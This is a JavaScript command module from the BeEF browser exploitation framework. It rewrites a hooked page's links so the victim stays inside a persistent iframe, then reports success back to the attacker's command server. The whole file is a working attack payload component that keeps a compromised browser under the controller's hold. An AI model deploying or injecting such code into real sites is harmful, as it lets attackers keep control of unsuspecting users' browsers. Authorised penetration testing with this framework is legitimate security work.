//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
    beef.dom.persistentIframe();
	beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Links have been rewritten to spawn an iFrame.');
});
